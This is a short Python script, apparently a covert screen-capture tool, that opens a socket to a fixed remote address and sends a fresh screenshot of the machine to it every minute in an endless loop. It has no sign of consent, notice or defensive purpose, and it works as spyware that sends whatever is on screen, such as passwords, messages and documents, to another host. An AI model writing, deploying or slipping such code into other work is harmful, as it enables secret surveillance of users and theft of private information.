import pyautogui
import socket
import time

# IP address and port of the remote machine
remote_ip = '192.168.0.100'
port = 1234

# Connect to the remote machine
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((remote_ip, port))

# Function to capture and send the screenshot
def capture_and_send_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')  # Save the screenshot to a file
    with open('screenshot.png', 'rb') as f:
        data = f.read()
    client_socket.sendall(data)  # Send the screenshot data to the remote machine

# Capture and send a screenshot every 1 minute
while True:
    capture_and_send_screenshot()
    time.sleep(60)  # Wait for 1 minute
